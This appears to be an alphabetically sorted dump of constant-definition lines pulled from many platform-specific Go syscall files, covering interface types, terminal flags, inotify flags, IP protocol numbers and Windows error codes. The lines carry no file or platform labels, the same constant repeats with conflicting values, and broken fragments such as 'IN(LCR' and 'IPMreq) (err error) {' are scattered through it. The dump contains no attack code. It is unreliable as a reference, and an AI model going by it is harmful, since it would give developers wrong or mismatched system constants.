IFT_SDSL                          = 0x60
IFT_SHDSL                         = 0xa9
IFT_SIP                                 = 0x1f
IFT_SIP                           = 0x1f
IFT_SIP                       = 0x1f
IFT_SIPSIG                        = 0xcc
IFT_SIPTG                         = 0xcb
IFT_SLIP                                = 0x1c
IFT_SLIP                          = 0x1c
IFT_SLIP                      = 0x1c
IFT_SMDSDXI                             = 0x2b
IFT_SMDSDXI                       = 0x2b
IFT_SMDSDXI                   = 0x2b
IFT_SMDSICIP                            = 0x34
IFT_SMDSICIP                      = 0x34
IFT_SMDSICIP                  = 0x34
IFT_SN                        = 0x38
IFT_SONET                               = 0x27
IFT_SONET                         = 0x27
IFT_SONET                     = 0x27
IFT_SONETOVERHEADCHANNEL          = 0xb9
IFT_SONETPATH                           = 0x32
IFT_SONETPATH                     = 0x32
IFT_SONETPATH                 = 0x32
IFT_SONETVT                             = 0x33
IFT_SONETVT                       = 0x33
IFT_SONETVT                   = 0x33
IFT_SP                        = 0x39
IFT_SRP                           = 0x97
IFT_SS7SIGLINK                    = 0x9c
IFT_STACKTOSTACK                  = 0x6f
IFT_STARLAN                             = 0xb
IFT_STARLAN                       = 0xb
IFT_STARLAN                   = 0xb
IFT_STF                                 = 0x39
IFT_STF                           = 0xd7
IFT_STF                           = 0xf3
IFT_T1                                  = 0x12
IFT_T1                            = 0x12
IFT_T1                        = 0x12
IFT_TDLC                          = 0x74
IFT_TELINK                        = 0xc8
IFT_TERMPAD                       = 0x5b
IFT_TR008                         = 0xb0
IFT_TRANSPHDLC                    = 0x7b
IFT_TUNNEL                        = 0x83
IFT_TUNNEL                    = 0x3b
IFT_ULTRA                               = 0x1d
IFT_ULTRA                         = 0x1d
IFT_ULTRA                     = 0x1d
IFT_USB                           = 0xa0
IFT_V11                           = 0x40
IFT_V35                                 = 0x2d
IFT_V35                           = 0x2d
IFT_V35                       = 0x2d
IFT_V36                           = 0x41
IFT_V37                           = 0x78
IFT_VDSL                          = 0x61
IFT_VIPA                      = 0x37
IFT_VIRTUALIPADDRESS              = 0x70
IFT_VIRTUALTG                     = 0xca
IFT_VOICEDID                      = 0xd5
IFT_VOICEEM                       = 0x64
IFT_VOICEEMFGD                    = 0xd3
IFT_VOICEENCAP                    = 0x67
IFT_VOICEFGDEANA                  = 0xd4
IFT_VOICEFXO                      = 0x65
IFT_VOICEFXS                      = 0x66
IFT_VOICEOVERATM                  = 0x98
IFT_VOICEOVERCABLE                = 0xc6
IFT_VOICEOVERFRAMERELAY           = 0x99
IFT_VOICEOVERIP                   = 0x68
IFT_X213                          = 0x5d
IFT_X25                                 = 0x5
IFT_X25                           = 0x5
IFT_X25                       = 0x5
IFT_X25DDN                              = 0x4
IFT_X25DDN                        = 0x4
IFT_X25DDN                    = 0x4
IFT_X25HUNTGROUP                  = 0x7a
IFT_X25MLP                        = 0x79
IFT_X25PLE                              = 0x28
IFT_X25PLE                        = 0x28
IFT_X25PLE                    = 0x28
IFT_XETHER                              = 0x1a
IFT_XETHER                        = 0x1a
IFT_XETHER                    = 0x1a
IF_TYPE_ATM                = 37
IF_TYPE_ETHERNET_CSMACD    = 6
IF_TYPE_IEEE1394           = 144
IF_TYPE_IEEE80211          = 71
IF_TYPE_ISO88025_TOKENRING = 9
IF_TYPE_OTHER              = 1
IF_TYPE_PPP                = 23
IF_TYPE_SOFTWARE_LOOPBACK  = 24
IF_TYPE_TUNNEL             = 131
IF_UNITSEL = -0x7ffb8cca
IGN/ 
IGNBRK                                      = 0x1
IGNBRK                                  = 0x1
IGNBRK                            = 0x1
IGNBRK                          = 0x0004
IGNBRK                         = 0x1
IGNBRK                        = 0x1
IGNCR                                       = 0x80
IGNCR                                   = 0x80
IGNCR                             = 0x80
IGNCR                           = 0x0008
IGNCR                          = 0x80
IGNCR                         = 0x80
IGNORE                = 0
IGNPAR                                      = 0x4
IGNPAR                                  = 0x4
IGNPAR                            = 0x4
IGNPAR                         = 0x4
IGNPAR                        = 0x4
IMAXBEL                                     = 0x2000
IMAXBEL                                 = 0x2000
IMAXBEL                           = 0x2000
IMAXBEL                        = 0x2000
IMAXBEL                       = 0x10000
IMAXBEL                       = 0x2000
IN(LCR
INET_E_AUTHENTICATION_REQUIRED                                            Handle        = 0x800C0009
INET_E_CANNOT_CONNECT                                                     Handle        = 0x800C0004
INET_E_CANNOT_INSTANTIATE_OBJECT                                          Handle        = 0x800C0010
INET_E_CANNOT_LOAD_DATA                                                   Handle        = 0x800C000F
INET_E_CONNECTION_TIMEOUT                                                 Handle        = 0x800C000B
INET_E_DATA_NOT_AVAILABLE                                                 Handle        = 0x800C0007
INET_E_DOWNLOAD_FAILURE                                                   Handle        = 0x800C0008
INET_E_INVALID_CERTIFICATE                                                Handle        = 0x800C0019
INET_E_INVALID_REQUEST                                                    Handle        = 0x800C000C
INET_E_INVALID_URL                                                        Handle        = 0x800C0002
INET_E_NO_SESSION                                                         Handle        = 0x800C0003
INET_E_NO_VALID_MEDIA                                                     Handle        = 0x800C000A
INET_E_OBJECT_NOT_FOUND                                                   Handle        = 0x800C0006
INET_E_REDIRECT_FAILED                                                    Handle        = 0x800C0014
INET_E_REDIRECT_TO_DIR                                                    Handle        = 0x800C0015
INET_E_RESOURCE_NOT_FOUND                                                 Handle        = 0x800C0005
INET_E_SECURITY_PROBLEM                                                   Handle        = 0x800C000E
INET_E_UNKNOWN_PROTOCOL                                                   Handle        = 0x800C000D
INFINITE              = 0xffffffff
INHERITED_ACCESS_ENTRY             = 0x10
INHERITED_ACE                      = 0x10
INHERITED_GRANDPARENT              = 0x20000000
INHERITED_PARENT                   = 0x10000000
INHERIT_NO_PROPAGATE               = 0x4
INHERIT_ONLY                       = 0x8
INHERIT_ONLY_ACE                   = 0x8
INHERIT_PARENT_AFFINITY          = 0x00010000
INLCR                                       = 0x40
INLCR                                   = 0x40
INLCR                             = 0x40
INLCR                           = 0x0020
INLCR                          = 0x40
INLCR                         = 0x40
INPCK                                       = 0x10
INPCK                                   = 0x10
INPCK                             = 0x10
INPCK                          = 0x10
INPCK                         = 0x10
INPLACE_E_FIRST                                                           syscall.Errno = 0x800401A0
INPLACE_E_LAST                                                            syscall.Errno = 0x800401AF
INPLACE_E_NOTOOLSPACE                                                     Handle        = 0x800401A1
INPLACE_E_NOTUNDOABLE                                                     Handle        = 0x800401A0
INPLACE_S_FIRST                                                           syscall.Errno = 0x000401A0
INPLACE_S_LAST                                                            syscall.Errno = 0x000401AF
INPLACE_S_TRUNCATED                                                       Handle        = 0x000401A0
INPUT_E_DEVICE_INFO                                                       Handle        = 0x80400006
INPUT_E_DEVICE_PROPERTY                                                   Handle        = 0x80400008
INPUT_E_FRAME                                                             Handle        = 0x80400004
INPUT_E_HISTORY                                                           Handle        = 0x80400005
INPUT_E_MULTIMODAL                                                        Handle        = 0x80400002
INPUT_E_OUT_OF_ORDER                                                      Handle        = 0x80400000
INPUT_E_PACKET                                                            Handle        = 0x80400003
INPUT_E_REENTRANCY                                                        Handle        = 0x80400001
INPUT_E_TRANSFORM                                                         Handle        = 0x80400007
INVALID_FILE_ATTRIBUTES = 0xffffffff
INVOKE_SYSCALL
IN_/ 
IN_ACCESS                                   = 0x1
IN_ALL_EVENTS                               = 0xfff
IN_ATTRIB                                   = 0x4
IN_AUTOCONF_MASK              = 0xffff0000
IN_AUTOCONF_NET               = 0xa9fe0000
IN_CLASSA_HOST                              = 0xffffff
IN_CLASSA_HOST                          = 0xffffff
IN_CLASSA_HOST                    = 0xffffff
IN_CLASSA_HOST                 = 0xffffff
IN_CLASSA_HOST                = 0xffffff
IN_CLASSA_MAX                               = 0x80
IN_CLASSA_MAX                           = 0x80
IN_CLASSA_MAX                     = 0x80
IN_CLASSA_MAX                  = 0x80
IN_CLASSA_MAX                 = 0x80
IN_CLASSA_NET                               = 0xff000000
IN_CLASSA_NET                           = 0xff000000
IN_CLASSA_NET                     = 0xff000000
IN_CLASSA_NET                  = 0xff000000
IN_CLASSA_NET                 = 0xff000000
IN_CLASSA_NSHIFT                            = 0x18
IN_CLASSA_NSHIFT                        = 0x18
IN_CLASSA_NSHIFT                  = 0x18
IN_CLASSA_NSHIFT               = 0x18
IN_CLASSA_NSHIFT              = 0x18
IN_CLASSB_HOST                              = 0xffff
IN_CLASSB_HOST                          = 0xffff
IN_CLASSB_HOST                    = 0xffff
IN_CLASSB_HOST                 = 0xffff
IN_CLASSB_HOST                = 0xffff
IN_CLASSB_MAX                               = 0x10000
IN_CLASSB_MAX                           = 0x10000
IN_CLASSB_MAX                     = 0x10000
IN_CLASSB_MAX                  = 0x10000
IN_CLASSB_MAX                 = 0x10000
IN_CLASSB_NET                               = 0xffff0000
IN_CLASSB_NET                           = 0xffff0000
IN_CLASSB_NET                     = 0xffff0000
IN_CLASSB_NET                  = 0xffff0000
IN_CLASSB_NET                 = 0xffff0000
IN_CLASSB_NSHIFT                            = 0x10
IN_CLASSB_NSHIFT                        = 0x10
IN_CLASSB_NSHIFT                  = 0x10
IN_CLASSB_NSHIFT               = 0x10
IN_CLASSB_NSHIFT              = 0x10
IN_CLASSC_HOST                              = 0xff
IN_CLASSC_HOST                          = 0xff
IN_CLASSC_HOST                    = 0xff
IN_CLASSC_HOST                 = 0xff
IN_CLASSC_HOST                = 0xff
IN_CLASSC_NET                               = 0xffffff00
IN_CLASSC_NET                           = 0xffffff00
IN_CLASSC_NET                     = 0xffffff00
IN_CLASSC_NET                  = 0xffffff00
IN_CLASSC_NET                 = 0xffffff00
IN_CLASSC_NSHIFT                            = 0x8
IN_CLASSC_NSHIFT                        = 0x8
IN_CLASSC_NSHIFT                  = 0x8
IN_CLASSC_NSHIFT               = 0x8
IN_CLASSC_NSHIFT              = 0x8
IN_CLASSD_HOST                          = 0xfffffff
IN_CLASSD_HOST                    = 0xfffffff
IN_CLASSD_HOST                 = 0xfffffff
IN_CLASSD_HOST                = 0xfffffff
IN_CLASSD_NET                           = 0xf0000000
IN_CLASSD_NET                     = 0xf0000000
IN_CLASSD_NET                  = 0xf0000000
IN_CLASSD_NET                 = 0xf0000000
IN_CLASSD_NSHIFT                        = 0x1c
IN_CLASSD_NSHIFT                  = 0x1c
IN_CLASSD_NSHIFT               = 0x1c
IN_CLASSD_NSHIFT              = 0x1c
IN_CLASSE_NET                 = 0xffffffff
IN_CLOEXEC                       = 0x400000
IN_CLOEXEC                       = 0x80000
IN_CLOSE                                    = 0x18
IN_CLOSE_NOWRITE                            = 0x10
IN_CLOSE_WRITE                              = 0x8
IN_CREATE                                   = 0x100
IN_DELETE                                   = 0x200
IN_DELETE_SELF                              = 0x400
IN_DONT_FOLLOW                              = 0x2000000
IN_EXCL_UNLINK                              = 0x4000000
IN_IGNORED                                  = 0x8000
IN_ISDIR                                    = 0x40000000
IN_LINKLOCALNETNUM                      = 0xa9fe0000
IN_LOOPBACKNET                              = 0x7f
IN_LOOPBACKNET                          = 0x7f
IN_LOOPBACKNET                    = 0x7f
IN_LOOPBACKNET                 = 0x7f
IN_LOOPBACKNET                = 0x7f
IN_MASK_ADD                                 = 0x20000000
IN_MASK_CREATE                              = 0x10000000
IN_MODIFY                                   = 0x2
IN_MOVE                                     = 0xc0
IN_MOVED_FROM                               = 0x40
IN_MOVED_TO                                 = 0x80
IN_MOVE_SELF                                = 0x800
IN_NONBLOCK                      = 0x4000
IN_NONBLOCK                      = 0x80
IN_NONBLOCK                      = 0x800
IN_ONESHOT                                  = 0x80000000
IN_ONLYDIR                                  = 0x1000000
IN_OPEN                                     = 0x20
IN_PRIVATE12_MASK             = 0xfff00000
IN_PRIVATE12_NET              = 0xac100000
IN_PRIVATE16_MASK             = 0xffff0000
IN_PRIVATE16_NET              = 0xc0a80000
IN_PRIVATE8_MASK              = 0xff000000
IN_PRIVATE8_NET               = 0xa000000
IN_Q_OVERFLOW                               = 0x4000
IN_RFC3021_HOST                   = 0x1
IN_RFC3021_MASK                   = 0xfffffffe
IN_RFC3021_MASK                = 0xfffffffe
IN_RFC3021_NET                    = 0xfffffffe
IN_RFC3021_NSHIFT                 = 0x1f
IN_UNMOUNT                                  = 0x2000
IN_USE                        = 0x1
IOCTL_VM_SOCKETS_/ 
IOCTL_VM_SOCKETS_GET_LOCAL_CID          = 0x400473d1
IOCTL_VM_SOCKETS_GET_LOCAL_CID   = 0x200007b9
IOCTL_VM_SOCKETS_GET_LOCAL_CID   = 0x7b9
IOC_IN                             = 0x80000000
IOC_INOUT                          = IOC_IN 
IOC_OUT                            = 0x40000000
IOC_VENDOR                         = 0x18000000
IOC_WS2                            = 0x08000000
IO_REPARSE_TAG_MOUNT_POINT       = 0xA0000003
IO_REPARSE_TAG_SYMLINK           = 0xA000000C
IP6F_MORE_FRAG                  = 0x0001
IP6F_OFF_MASK                   = 0xfff8
IP6F_RESERVED_MASK              = 0x0006
IP6OPT_JUMBO                    = 0xc2
IP6OPT_JUMBO_LEN                = 6
IP6OPT_MUTABLE                  = 0x20
IP6OPT_NSAP_ADDR                = 0xc3
IP6OPT_PAD1                     = 0x00
IP6OPT_PADN                     = 0x01
IP6OPT_ROUTER_ALERT             = 0x05
IP6OPT_TUNNEL_LIMIT             = 0x04
IP6OPT_TYPE_DISCARD             = 0x40
IP6OPT_TYPE_FORCEICMP           = 0x80
IP6OPT_TYPE_ICMP                = 0xc0
IP6OPT_TYPE_SKIP                = 0x00
IP6_ALERT_AN                    = 0x0002
IP6_ALERT_MLD                   = 0x0000
IP6_ALERT_RSVP                  = 0x0001
IPC_CREAT   = 0x200
IPC_EXCL    = 0x400
IPC_NOWAIT  = 0x800
IPC_PRIVATE = 0x0
IPC_RMID = 0x0
IPC_SET  = 0x1
IPC_STAT = 0x2
IPMreq) (err error) {
IPMreqn) (err error) {
IPPORT_RESERVED                 = 1024
IPPORT_USERRESERVED             = 5000
IPPROTO
IPPROTO_3PC                             = 0x22
IPPROTO_3PC                       = 0x22
IPPROTO_3PC                    = 0x22
IPPROTO_ADFS                            = 0x44
IPPROTO_ADFS                      = 0x44
IPPROTO_ADFS                   = 0x44
IPPROTO_AH                                  = 0x33
IPPROTO_AH                              = 0x33
IPPROTO_AH                        = 0x33
IPPROTO_AH                      = 51
IPPROTO_AH                     = 0x33
IPPROTO_AH                    = 0x33
IPPROTO_AHIP                            = 0x3d
IPPROTO_AHIP                      = 0x3d
IPPROTO_AHIP                   = 0x3d
IPPROTO_APES                            = 0x63
IPPROTO_APES                      = 0x63
IPPROTO_APES                   = 0x63
IPPROTO_ARGUS                           = 0xd
IPPROTO_ARGUS                     = 0xd
IPPROTO_ARGUS                  = 0xd
IPPROTO_AX25                            = 0x5d
IPPROTO_AX25                      = 0x5d
IPPROTO_AX25                   = 0x5d
IPPROTO_BEETPH                              = 0x5e
IPPROTO_BHA                             = 0x31
IPPROTO_BHA                       = 0x31
IPPROTO_BHA                    = 0x31
IPPROTO_BIP                   = 0x53
IPPROTO_BLT                             = 0x1e
IPPROTO_BLT                       = 0x1e
IPPROTO_BLT                    = 0x1e
IPPROTO_BRSATMON                        = 0x4c
IPPROTO_BRSATMON                  = 0x4c
IPPROTO_BRSATMON               = 0x4c
IPPROTO_CARP                      = 0x70
IPPROTO_CARP                   = 0x70
IPPROTO_CFTP                            = 0x3e
IPPROTO_CFTP                      = 0x3e
IPPROTO_CFTP                   = 0x3e
IPPROTO_CHAOS                           = 0x10
IPPROTO_CHAOS                     = 0x10
IPPROTO_CHAOS                  = 0x10
IPPROTO_CMTP                            = 0x26
IPPROTO_CMTP                      = 0x26
IPPROTO_CMTP                   = 0x26
IPPROTO_COMP                                = 0x6c
IPPROTO_CPHB                            = 0x49
IPPROTO_CPHB                      = 0x49
IPPROTO_CPHB                   = 0x49
IPPROTO_CPNX                            = 0x48
IPPROTO_CPNX                      = 0x48
IPPROTO_CPNX                   = 0x48
IPPROTO_DCCP                                = 0x21
IPPROTO_DDP                             = 0x25
IPPROTO_DDP                       = 0x25
IPPROTO_DDP                    = 0x25
IPPROTO_DGP                             = 0x56
IPPROTO_DGP                       = 0x56
IPPROTO_DGP                    = 0x56
IPPROTO_DIVERT                          = 0xfe
IPPROTO_DIVERT                    = 0x102
IPPROTO_DIVERT                    = 0xfe
IPPROTO_DIVERT                 = 0x102
IPPROTO_DIVERT_INIT               = 0x2
IPPROTO_DIVERT_RESP               = 0x1
IPPROTO_DONE                            = 0x101
IPPROTO_DONE                      = 0x101
IPPROTO_DONE                   = 0x101
IPPROTO_DSTOPTS                             = 0x3c
IPPROTO_DSTOPTS                         = 0x3c
IPPROTO_DSTOPTS                   = 0x3c
IPPROTO_DSTOPTS                 = 60
IPPROTO_DSTOPTS                = 0x3c
IPPROTO_DSTOPTS               = 0x3c
IPPROTO_EGP                                 = 0x8
IPPROTO_EGP                             = 0x8
IPPROTO_EGP                       = 0x8
IPPROTO_EGP                     = 8
IPPROTO_EGP                    = 0x8
IPPROTO_EGP                   = 0x8
IPPROTO_EMCON                           = 0xe
IPPROTO_EMCON                     = 0xe
IPPROTO_EMCON                  = 0xe
IPPROTO_ENCAP                               = 0x62
IPPROTO_ENCAP                           = 0x62
IPPROTO_ENCAP                     = 0x62
IPPROTO_ENCAP                  = 0x62
IPPROTO_ENCAP                 = 0x4
IPPROTO_EON                             = 0x50
IPPROTO_EON                       = 0x50
IPPROTO_EON                    = 0x50
IPPROTO_EON                   = 0x50
IPPROTO_ESP                                 = 0x32
IPPROTO_ESP                             = 0x32
IPPROTO_ESP                       = 0x32
IPPROTO_ESP                     = 50
IPPROTO_ESP                    = 0x32
IPPROTO_ESP                   = 0x32
IPPROTO_ETHERIP                         = 0x61
IPPROTO_ETHERIP                   = 0x61
IPPROTO_ETHERIP                = 0x61
IPPROTO_ETHERNET                            = 0x8f
IPPROTO_FRAGMENT                            = 0x2c
IPPROTO_FRAGMENT                        = 0x2c
IPPROTO_FRAGMENT                  = 0x2c
IPPROTO_FRAGMENT                = 44
IPPROTO_FRAGMENT               = 0x2c
IPPROTO_FRAGMENT              = 0x2c
IPPROTO_GGP                             = 0x3
IPPROTO_GGP                       = 0x3
IPPROTO_GGP                     = 2
IPPROTO_GGP                    = 0x3
IPPROTO_GGP                   = 0x3
IPPROTO_GIF                   = 0x8c
IPPROTO_GMTP                            = 0x64
IPPROTO_GMTP                      = 0x64
IPPROTO_GMTP                   = 0x64
IPPROTO_GRE                                 = 0x2f
IPPROTO_GRE                             = 0x2f
IPPROTO_GRE                       = 0x2f
IPPROTO_GRE                    = 0x2f
IPPROTO_GRE                   = 0x2f
IPPROTO_HELLO                           = 0x3f
IPPROTO_HELLO                     = 0x3f
IPPROTO_HELLO                  = 0x3f
IPPROTO_HELLO                 = 0x3f
IPPROTO_HIP                    = 0x8b
IPPROTO_HMP                             = 0x14
IPPROTO_HMP                       = 0x14
IPPROTO_HMP                    = 0x14
IPPROTO_HOPOPTS                             = 0x0
IPPROTO_HOPOPTS                         = 0x0
IPPROTO_HOPOPTS                   = 0x0
IPPROTO_HOPOPTS                 = 0
IPPROTO_HOPOPTS                = 0x0
IPPROTO_HOPOPTS               = 0x0
IPPROTO_ICMP                                = 0x1
IPPROTO_ICMP                            = 0x1
IPPROTO_ICMP                      = 0x1
IPPROTO_ICMP                    = 1
IPPROTO_ICMP                   = 0x1
IPPROTO_ICMP                  = 0x1
IPPROTO_ICMP    = 1
IPPROTO_ICMPV6                              = 0x3a
IPPROTO_ICMPV6                          = 0x3a
IPPROTO_ICMPV6                    = 0x3a
IPPROTO_ICMPV6                  = 58
IPPROTO_ICMPV6                 = 0x3a
IPPROTO_ICMPV6                = 0x3a
IPPROTO_ICMPV6  = 58
IPPROTO_IDP                                 = 0x16
IPPROTO_IDP                             = 0x16
IPPROTO_IDP                       = 0x16
IPPROTO_IDP                     = 22
IPPROTO_IDP                    = 0x16
IPPROTO_IDP                   = 0x16
IPPROTO_IDPR                            = 0x23
IPPROTO_IDPR                      = 0x23
IPPROTO_IDPR                   = 0x23
IPPROTO_IDRP                            = 0x2d
IPPROTO_IDRP                      = 0x2d
IPPROTO_IDRP                   = 0x2d
IPPROTO_IGMP                                = 0x2
IPPROTO_IGMP                            = 0x2
IPPROTO_IGMP                      = 0x2
IPPROTO_IGMP                   = 0x2
IPPROTO_IGMP                  = 0x2
IPPROTO_IGMP    = 2
IPPROTO_IGP                             = 0x55
IPPROTO_IGP                       = 0x55
IPPROTO_IGP                    = 0x55
IPPROTO_IGRP                            = 0x58
IPPROTO_IGRP                      = 0x58
IPPROTO_IGRP                   = 0x58
IPPROTO_IL                              = 0x28
IPPROTO_IL                        = 0x28
IPPROTO_IL                     = 0x28
IPPROTO_INLSP                           = 0x34
IPPROTO_INLSP                     = 0x34
IPPROTO_INLSP                  = 0x34
IPPROTO_INP                             = 0x20
IPPROTO_INP                       = 0x20
IPPROTO_INP                    = 0x20
IPPROTO_IP                                  = 0x0
IPPROTO_IP                              = 0x0
IPPROTO_IP                        = 0x0
IPPROTO_IP                      = 0
IPPROTO_IP                     = 0x0
IPPROTO_IP                    = 0x0
IPPROTO_IP      = 0
IPPROTO_IPCOMP                          = 0x6c
IPPROTO_IPCOMP                    = 0x6c
IPPROTO_IPCOMP                 = 0x6c
IPPROTO_IPCV                            = 0x47
IPPROTO_IPCV                      = 0x47
IPPROTO_IPCV                   = 0x47
IPPROTO_IPEIP                           = 0x5e
IPPROTO_IPEIP                     = 0x5e
IPPROTO_IPEIP                  = 0x5e
IPPROTO_IPIP                                = 0x4
IPPROTO_IPIP                            = 0x4
IPPROTO_IPIP                      = 0x4
IPPROTO_IPIP                   = 0x4
IPPROTO_IPIP                  = 0x4
IPPROTO_IPPC                            = 0x43
IPPROTO_IPPC                      = 0x43
IPPROTO_IPPC                   = 0x43
IPPROTO_IPV4                            = 0x4
IPPROTO_IPV4                      = 0x4
IPPROTO_IPV4                   = 0x4
IPPROTO_IPV6                                = 0x29
IPPROTO_IPV6                            = 0x29
IPPROTO_IPV6                      = 0x29
IPPROTO_IPV6                    = 41
IPPROTO_IPV6                   = 0x29
IPPROTO_IPV6                  = 0x29
IPPROTO_IPV6    = 41
IPPROTO_IPV6_ICMP                 = 0x3a
IPPROTO_IRTP                            = 0x1c
IPPROTO_IRTP                      = 0x1c
IPPROTO_IRTP                   = 0x1c
IPPROTO_KRYPTOLAN                       = 0x41
IPPROTO_KRYPTOLAN                 = 0x41
IPPROTO_KRYPTOLAN              = 0x41
IPPROTO_L2TP                                = 0x73
IPPROTO_LARP                            = 0x5b
IPPROTO_LARP                      = 0x5b
IPPROTO_LARP                   = 0x5b
IPPROTO_LEAF1                           = 0x19
IPPROTO_LEAF1                     = 0x19
IPPROTO_LEAF1                  = 0x19
IPPROTO_LEAF2                           = 0x1a
IPPROTO_LEAF2                     = 0x1a
IPPROTO_LEAF2                  = 0x1a
IPPROTO_LOCAL                 = 0x3f
IPPROTO_MAX                             = 0x100
IPPROTO_MAX                       = 0x100
IPPROTO_MAX                     = 256
IPPROTO_MAX                    = 0x100
IPPROTO_MAX                   = 0x100
IPPROTO_MAXID                           = 0x34
IPPROTO_MAXID                     = 0x103
IPPROTO_MAXID                     = 0x34
IPPROTO_MAXID   = 0x34
IPPROTO_MEAS                            = 0x13
IPPROTO_MEAS                      = 0x13
IPPROTO_MEAS                   = 0x13
IPPROTO_MH                                  = 0x87
IPPROTO_MH                     = 0x87
IPPROTO_MH                    = 0x87
IPPROTO_MHRP                            = 0x30
IPPROTO_MHRP                      = 0x30
IPPROTO_MHRP                   = 0x30
IPPROTO_MICP                            = 0x5f
IPPROTO_MICP                      = 0x5f
IPPROTO_MICP                   = 0x5f
IPPROTO_MOBILE                    = 0x37
IPPROTO_MOBILE                 = 0x37
IPPROTO_MPLS                                = 0x89
IPPROTO_MPLS                      = 0x89
IPPROTO_MPLS                   = 0x89
IPPROTO_MPTCP                               = 0x106
IPPROTO_MTP                                 = 0x5c
IPPROTO_MTP                             = 0x5c
IPPROTO_MTP                       = 0x5c
IPPROTO_MTP                    = 0x5c
IPPROTO_MUX                             = 0x12
IPPROTO_MUX                       = 0x12
IPPROTO_MUX                    = 0x12
IPPROTO_ND                              = 0x4d
IPPROTO_ND                        = 0x4d
IPPROTO_ND                     = 0x4d
IPPROTO_ND                    = 0x4d
IPPROTO_NHRP                            = 0x36
IPPROTO_NHRP                      = 0x36
IPPROTO_NHRP                   = 0x36
IPPROTO_NONE                                = 0x3b
IPPROTO_NONE                            = 0x3b
IPPROTO_NONE                      = 0x3b
IPPROTO_NONE                    = 59
IPPROTO_NONE                   = 0x3b
IPPROTO_NONE                  = 0x3b
IPPROTO_NSP                             = 0x1f
IPPROTO_NSP                       = 0x1f
IPPROTO_NSP                    = 0x1f
IPPROTO_NVPII                           = 0xb
IPPROTO_NVPII                     = 0xb
IPPROTO_NVPII                  = 0xb
IPPROTO_OLD_DIVERT             = 0xfe
IPPROTO_OSPF                  = 0x59
IPPROTO_OSPFIGP                         = 0x59
IPPROTO_OSPFIGP                   = 0x59
IPPROTO_OSPFIGP                = 0x59
IPPROTO_PFSYNC                    = 0xf0
IPPROTO_PFSYNC                 = 0xf0
IPPROTO_PGM                             = 0x71
IPPROTO_PGM                       = 0x71
IPPROTO_PGM                    = 0x71
IPPROTO_PIGP                            = 0x9
IPPROTO_PIGP                      = 0x9
IPPROTO_PIGP                   = 0x9
IPPROTO_PIM                                 = 0x67
IPPROTO_PIM                             = 0x67
IPPROTO_PIM                       = 0x67
IPPROTO_PIM                    = 0x67
IPPROTO_PIM                   = 0x67
IPPROTO_PRM                             = 0x15
IPPROTO_PRM                       = 0x15
IPPROTO_PRM                    = 0x15
IPPROTO_PUP                                 = 0xc
IPPROTO_PUP                             = 0xc
IPPROTO_PUP                       = 0xc
IPPROTO_PUP                     = 12
IPPROTO_PUP                    = 0xc
IPPROTO_PUP                   = 0xc
IPPROTO_PVP                             = 0x4b
IPPROTO_PVP                       = 0x4b
IPPROTO_PVP                    = 0x4b
IPPROTO_QOS                   = 0x2d
IPPROTO_RAW                                 = 0xff
IPPROTO_RAW                             = 0xff
IPPROTO_RAW                       = 0xff
IPPROTO_RAW                     = 255
IPPROTO_RAW                    = 0xff
IPPROTO_RAW                   = 0xff
IPPROTO_RCCMON                          = 0xa
IPPROTO_RCCMON                    = 0xa
IPPROTO_RCCMON                 = 0xa
IPPROTO_RDP                             = 0x1b
IPPROTO_RDP                       = 0x1b
IPPROTO_RDP                    = 0x1b
IPPROTO_RESERVED_253           = 0xfd
IPPROTO_RESERVED_254           = 0xfe
IPPROTO_RM      = 113
IPPROTO_ROUTING                             = 0x2b
IPPROTO_ROUTING                         = 0x2b
IPPROTO_ROUTING                   = 0x2b
IPPROTO_ROUTING                 = 43
IPPROTO_ROUTING                = 0x2b
IPPROTO_ROUTING               = 0x2b
IPPROTO_RSVP                                = 0x2e
IPPROTO_RSVP                            = 0x2e
IPPROTO_RSVP                      = 0x2e
IPPROTO_RSVP                   = 0x2e
IPPROTO_RSVP                  = 0x2e
IPPROTO_RVD                             = 0x42
IPPROTO_RVD                       = 0x42
IPPROTO_RVD                    = 0x42
IPPROTO_SATEXPAK                        = 0x40
IPPROTO_SATEXPAK                  = 0x40
IPPROTO_SATEXPAK               = 0x40
IPPROTO_SATMON                          = 0x45
IPPROTO_SATMON                    = 0x45
IPPROTO_SATMON                 = 0x45
IPPROTO_SCCSP                           = 0x60
IPPROTO_SCCSP                     = 0x60
IPPROTO_SCCSP                  = 0x60
IPPROTO_SCTP                                = 0x84
IPPROTO_SCTP                            = 0x84
IPPROTO_SCTP                   = 0x84
IPPROTO_SCTP                  = 0x84
IPPROTO_SDRP                            = 0x2a
IPPROTO_SDRP                      = 0x2a
IPPROTO_SDRP                   = 0x2a
IPPROTO_SEND                   = 0x103
IPPROTO_SEP                             = 0x21
IPPROTO_SEP                       = 0x21
IPPROTO_SEP                    = 0x21
IPPROTO_SHIM6                  = 0x8c
IPPROTO_SKIP                      = 0x39
IPPROTO_SKIP                   = 0x39
IPPROTO_SPACER                 = 0x7fff
IPPROTO_SRPC                            = 0x5a
IPPROTO_SRPC                      = 0x5a
IPPROTO_SRPC                   = 0x5a
IPPROTO_ST                              = 0x7
IPPROTO_ST                        = 0x7
IPPROTO_ST                     = 0x7
IPPROTO_SVMTP                           = 0x52
IPPROTO_SVMTP                     = 0x52
IPPROTO_SVMTP                  = 0x52
IPPROTO_SWIPE                           = 0x35
IPPROTO_SWIPE                     = 0x35
IPPROTO_SWIPE                  = 0x35
IPPROTO_TCF                             = 0x57
IPPROTO_TCF                       = 0x57
IPPROTO_TCF                    = 0x57
IPPROTO_TCP                                 = 0x6
IPPROTO_TCP                             = 0x6
IPPROTO_TCP                       = 0x6
IPPROTO_TCP                     = 6
IPPROTO_TCP                    = 0x6
IPPROTO_TCP                   = 0x6
IPPROTO_TCP     = 6
IPPROTO_TLSP                      = 0x38
IPPROTO_TLSP                   = 0x38
IPPROTO_TP                                  = 0x1d
IPPROTO_TP                              = 0x1d
IPPROTO_TP                        = 0x1d
IPPROTO_TP                     = 0x1d
IPPROTO_TP                    = 0x1d
IPPROTO_TPXX                            = 0x27
IPPROTO_TPXX                      = 0x27
IPPROTO_TPXX                   = 0x27
IPPROTO_TRUNK1                          = 0x17
IPPROTO_TRUNK1                    = 0x17
IPPROTO_TRUNK1                 = 0x17
IPPROTO_TRUNK2                          = 0x18
IPPROTO_TRUNK2                    = 0x18
IPPROTO_TRUNK2                 = 0x18
IPPROTO_TTP                             = 0x54
IPPROTO_TTP                       = 0x54
IPPROTO_TTP                    = 0x54
IPPROTO_UDP                                 = 0x11
IPPROTO_UDP                             = 0x11
IPPROTO_UDP                       = 0x11
IPPROTO_UDP                     = 17
IPPROTO_UDP                    = 0x11
IPPROTO_UDP                   = 0x11
IPPROTO_UDP     = 17
